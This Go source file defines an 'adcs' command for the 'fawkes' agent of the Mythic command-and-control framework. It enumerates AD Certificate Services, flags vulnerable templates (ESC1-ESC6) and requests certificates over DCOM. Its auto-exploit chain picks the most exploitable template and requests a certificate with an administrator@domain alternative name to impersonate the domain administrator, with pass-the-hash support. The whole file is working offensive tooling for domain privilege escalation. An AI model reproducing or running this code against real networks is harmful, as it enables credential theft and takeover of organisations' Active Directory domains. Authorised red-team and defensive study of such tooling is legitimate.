package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"regexp"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "adcs",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "adcs_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Enumerate AD Certificate Services (ADCS), find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM.",
		HelpString:          "adcs -action find -server 192.168.1.1 -username user@domain.local -password pass\nadcs -action cas -server dc01\nadcs -action templates -server dc01\nadcs -action request -server ca01 -ca_name CA-NAME -template User -username DOMAIN\\user -password pass [-alt_name admin@domain.local]",
		Version:             1,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1649"},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"adcsFindDone":    adcsFindDone,
			"adcsExploitDone": adcsExploitDone,
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				Description:      "cas: list CAs, templates: list templates, find: find vulnerable templates, request: request a certificate via DCOM, auto-exploit: automated find→request chain",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"find", "cas", "templates", "request", "auto-exploit"},
				DefaultValue:     "find",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "server",
				CLIName:              "server",
				ModalDisplayName:     "Server",
				Description:          "DC/CA server IP address or hostname",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:                 "username",
				CLIName:              "username",
				ModalDisplayName:     "Username",
				Description:          "Username (DOMAIN\\user or user@domain format)",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:         "",
				DynamicQueryFunction: getCallbackUserList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "password",
				CLIName:          "password",
				ModalDisplayName: "Password",
				Description:      "Password for authentication",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "hash",
				CLIName:          "hash",
				ModalDisplayName: "NT Hash",
				Description:      "NT hash for pass-the-hash authentication (request action only)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "domain",
				CLIName:          "domain",
				ModalDisplayName: "Domain",
				Description:      "Domain name (auto-parsed from username if DOMAIN\\user or user@domain format)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				DynamicQueryFunction: getCallbackDomainList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "port",
				CLIName:          "port",
				ModalDisplayName: "Port",
				Description:      "LDAP port (default: 389, or 636 for LDAPS). Not used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     389,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "use_tls",
				CLIName:          "use_tls",
				ModalDisplayName: "Use LDAPS",
				Description:      "Use TLS/LDAPS instead of plain LDAP. Not used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "ca_name",
				CLIName:          "ca_name",
				ModalDisplayName: "CA Name",
				Description:      "Certificate Authority name (from 'adcs -action cas'). Required for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "template",
				CLIName:          "template",
				ModalDisplayName: "Template",
				Description:      "Certificate template name (e.g., 'User', 'Machine', or a vulnerable template). Required for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "subject",
				CLIName:          "subject",
				ModalDisplayName: "Subject",
				Description:      "Certificate subject (e.g., 'CN=user'). Defaults to CN=<username>.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "alt_name",
				CLIName:          "alt_name",
				ModalDisplayName: "Alt Name (SAN)",
				Description:      "Subject Alternative Name for ESC1/ESC6 (e.g., 'administrator@domain.local' for UPN impersonation)",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:             "timeout",
				CLIName:          "timeout",
				ModalDisplayName: "Timeout",
				Description:      "Connection timeout in seconds (default: 30). Used for request action.",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				DefaultValue:     30,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: AD Certificate Services %s operation. ADCS exploitation generates certificate enrollment events (Event ID 4886/4887) and LDAP queries against CA configuration. Misconfigured template abuse (ESC1-ESC8) is increasingly monitored by purple teams.", action),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			server, _ := taskData.Args.GetStringArg("server")

			if action == "auto-exploit" {
				// Automated chain: find → parse vulnerabilities → request
				displayMsg := fmt.Sprintf("ADCS auto-exploit chain on %s", server)
				response.DisplayParams = &displayMsg

				// Store chain context (server, credentials) in Stdout for completion functions
				username, _ := taskData.Args.GetStringArg("username")
				password, _ := taskData.Args.GetStringArg("password")
				hash, _ := taskData.Args.GetStringArg("hash")
				domain, _ := taskData.Args.GetStringArg("domain")
				port, _ := taskData.Args.GetNumberArg("port")
				useTLS, _ := taskData.Args.GetBooleanArg("use_tls")
				chainCtx, _ := json.Marshal(map[string]interface{}{
					"server":   server,
					"username": username,
					"password": password,
					"hash":     hash,
					"domain":   domain,
					"port":     port,
					"use_tls":  useTLS,
				})
				chainCtxStr := string(chainCtx)
				response.Stdout = &chainCtxStr

				// Build find subtask params
				findParams, _ := json.Marshal(map[string]interface{}{
					"action":   "find",
					"server":   server,
					"username": username,
					"password": password,
					"hash":     hash,
					"domain":   domain,
					"port":     port,
					"use_tls":  useTLS,
				})

				callbackFunc := "adcsFindDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(mythicrpc.MythicRPCTaskCreateSubtaskMessage{
					TaskID:                  taskData.Task.ID,
					SubtaskCallbackFunction: &callbackFunc,
					CommandName:             "adcs",
					Params:                  string(findParams),
				})
				if err != nil {
					logging.LogError(err, "Failed to create ADCS find subtask")
					response.Success = false
					response.Error = "Failed to create find subtask: " + err.Error()
				}

				return response
			}

			displayMsg := fmt.Sprintf("ADCS %s on %s", action, server)
			if action == "request" {
				template, _ := taskData.Args.GetStringArg("template")
				caName, _ := taskData.Args.GetStringArg("ca_name")
				altName, _ := taskData.Args.GetStringArg("alt_name")
				displayMsg = fmt.Sprintf("ADCS request template=%s ca=%s on %s", template, caName, server)
				if altName != "" {
					displayMsg += fmt.Sprintf(" (SAN: %s)", altName)
				}
			}
			response.DisplayParams = &displayMsg

			artifactType := "API Call"
			artifactMsg := fmt.Sprintf("LDAP ADCS query: %s on %s", action, server)
			if action == "request" {
				artifactMsg = fmt.Sprintf("DCOM ICertRequestD::Request on %s", server)
			}

			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
				TaskID:           taskData.Task.ID,
				BaseArtifactType: artifactType,
				ArtifactMessage:  artifactMsg,
			})

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			server, _ := processResponse.TaskData.Args.GetStringArg("server")

			switch action {
			case "find":
				// Track CA discovery and vulnerable templates
				if strings.Contains(responseText, "Certificate Authority") || strings.Contains(responseText, "CA:") {
					mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
						TaskID:           processResponse.TaskData.Task.ID,
						BaseArtifactType: "Configuration",
						ArtifactMessage:  fmt.Sprintf("ADCS enumeration on %s: CA infrastructure discovered", server),
					})
				}
				// Flag vulnerable templates
				for _, esc := range []string{"ESC1", "ESC2", "ESC3", "ESC4", "ESC6"} {
					if strings.Contains(responseText, esc) {
						mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
							TaskID:           processResponse.TaskData.Task.ID,
							BaseArtifactType: "Configuration",
							ArtifactMessage:  fmt.Sprintf("ADCS vulnerable template detected: %s on %s", esc, server),
						})
					}
				}
			case "request":
				// Track certificate request as Credential artifact
				template, _ := processResponse.TaskData.Args.GetStringArg("template")
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           processResponse.TaskData.Task.ID,
					BaseArtifactType: "Credential",
					ArtifactMessage:  fmt.Sprintf("Certificate requested: template=%s from %s", template, server),
				})
			}
			return response
		},
	})
}

// adcsFindDone is the completion function for the auto-exploit chain's find subtask.
// It parses the find output for vulnerable templates and creates a request subtask
// targeting the most exploitable template found.
func adcsFindDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	// Get find output
	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" || subtaskData.Task.Status != "success" {
		completed := true
		response.Completed = &completed
		msg := "ADCS auto-exploit: find subtask failed or returned empty results"
		response.Stdout = &msg
		return response
	}

	// Parse chain context from parent task
	var chainCtx map[string]interface{}
	if taskData.Task.Stdout != "" {
		json.Unmarshal([]byte(taskData.Task.Stdout), &chainCtx)
	}
	if chainCtx == nil {
		completed := true
		response.Completed = &completed
		msg := "ADCS auto-exploit: chain context lost"
		response.Stdout = &msg
		return response
	}

	// Parse vulnerable templates from find output
	// Format: "[!] TemplateName (CA: CA-NAME)"
	// ESC indicators on following lines: "ESC1:", "ESC4:", "ESC6:"
	type vulnTemplate struct {
		name    string
		caName  string
		escType string
	}

	var vulns []vulnTemplate
	lines := strings.Split(responseText, "\n")
	templateRe := regexp.MustCompile(`\[!\]\s+(\S+)\s+\(CA:\s+([^)]+)\)`)
	for i, line := range lines {
		matches := templateRe.FindStringSubmatch(line)
		if matches == nil {
			continue
		}
		templateName := matches[1]
		caName := matches[2]

		// Look at following lines for ESC type
		escType := ""
		for j := i + 1; j < len(lines) && j < i+5; j++ {
			trimmed := strings.TrimSpace(lines[j])
			if strings.HasPrefix(trimmed, "ESC1") {
				escType = "ESC1"
				break
			} else if strings.HasPrefix(trimmed, "ESC6") {
				escType = "ESC6"
				break
			} else if strings.HasPrefix(trimmed, "ESC4") {
				escType = "ESC4"
				break
			} else if strings.HasPrefix(trimmed, "ESC2") {
				escType = "ESC2"
				break
			} else if strings.HasPrefix(trimmed, "ESC3") {
				escType = "ESC3"
				break
			}
			// Stop if we hit another template header
			if strings.HasPrefix(trimmed, "[") {
				break
			}
		}
		if escType != "" {
			vulns = append(vulns, vulnTemplate{name: templateName, caName: caName, escType: escType})
		}
	}

	// Also check for ESC6 at CA level
	esc6CA := ""
	for _, line := range lines {
		if strings.Contains(line, "ESC6 VULNERABLE") {
			// Extract CA name from line like "  CA-NAME: ESC6 VULNERABLE"
			parts := strings.SplitN(strings.TrimSpace(line), ":", 2)
			if len(parts) > 0 {
				esc6CA = strings.TrimSpace(parts[0])
			}
		}
	}

	if len(vulns) == 0 {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("ADCS auto-exploit: no exploitable templates found.\n\nFind output:\n%s", truncateString(responseText, 500))
		response.Stdout = &msg
		return response
	}

	// Pick the best vulnerability (ESC1 > ESC6 > ESC4 > ESC2 > ESC3)
	priority := map[string]int{"ESC1": 1, "ESC6": 2, "ESC4": 3, "ESC2": 4, "ESC3": 5}
	best := vulns[0]
	for _, v := range vulns[1:] {
		if priority[v.escType] < priority[best.escType] {
			best = v
		}
	}

	// Build request params
	server := ""
	if s, ok := chainCtx["server"].(string); ok {
		server = s
	}
	username := ""
	if u, ok := chainCtx["username"].(string); ok {
		username = u
	}
	password := ""
	if p, ok := chainCtx["password"].(string); ok {
		password = p
	}
	hash := ""
	if h, ok := chainCtx["hash"].(string); ok {
		hash = h
	}

	reqParams := map[string]interface{}{
		"action":   "request",
		"server":   server,
		"ca_name":  best.caName,
		"template": best.name,
		"username": username,
		"password": password,
		"hash":     hash,
		"timeout":  30,
	}

	// For ESC1/ESC6, request with SAN for impersonation
	if best.escType == "ESC1" || (best.escType == "ESC6" && esc6CA == best.caName) {
		// Default to administrator@<domain> for maximum impact
		domain := ""
		if d, ok := chainCtx["domain"].(string); ok {
			domain = d
		}
		if domain == "" && username != "" {
			// Extract domain from user@domain or DOMAIN\user
			if strings.Contains(username, "@") {
				parts := strings.SplitN(username, "@", 2)
				domain = parts[1]
			} else if strings.Contains(username, "\\") {
				parts := strings.SplitN(username, "\\", 2)
				domain = parts[0]
			}
		}
		if domain != "" {
			reqParams["alt_name"] = "administrator@" + strings.ToLower(domain)
		}
	}

	reqJSON, _ := json.Marshal(reqParams)

	msg := fmt.Sprintf("ADCS auto-exploit: found %d vulnerable templates.\nBest target: %s (CA: %s, %s)\nProceeding with certificate request...",
		len(vulns), best.name, best.caName, best.escType)
	response.Stdout = &msg

	// Create request subtask
	callbackFunc := "adcsExploitDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(mythicrpc.MythicRPCTaskCreateSubtaskMessage{
		TaskID:                  taskData.Task.ID,
		SubtaskCallbackFunction: &callbackFunc,
		CommandName:             "adcs",
		Params:                  string(reqJSON),
	})
	if err != nil {
		logging.LogError(err, "Failed to create ADCS request subtask")
		completed := true
		response.Completed = &completed
		errMsg := fmt.Sprintf("Auto-exploit: found %s but failed to create request subtask: %v", best.escType, err)
		response.Stdout = &errMsg
	}

	return response
}

// adcsExploitDone is the completion function for the auto-exploit chain's request subtask.
func adcsExploitDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, _ *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	completed := true
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:    taskData.Task.ID,
		Success:   true,
		Completed: &completed,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	status := subtaskData.Task.Status

	var summary string
	if status == "success" && strings.Contains(responseText, "ISSUED") {
		summary = fmt.Sprintf("=== ADCS Auto-Exploit SUCCESSFUL ===\nCertificate ISSUED!\n\n%s", truncateString(responseText, 1000))

		// Tag as high-value credential
		tagTask(taskData.Task.ID, "ADCS-EXPLOIT",
			"Auto-exploit chain: vulnerable template exploited, certificate issued")

		// Register certificate as credential artifact
		mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
			TaskID:           taskData.Task.ID,
			BaseArtifactType: "Credential",
			ArtifactMessage:  "ADCS auto-exploit: certificate issued via vulnerable template",
		})
	} else {
		summary = fmt.Sprintf("=== ADCS Auto-Exploit Chain Complete ===\nRequest status: %s\n\n%s", status, truncateString(responseText, 500))
	}

	response.Stdout = &summary
	return response
}

// truncateString truncates a string to maxLen, adding "..." if truncated.
func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
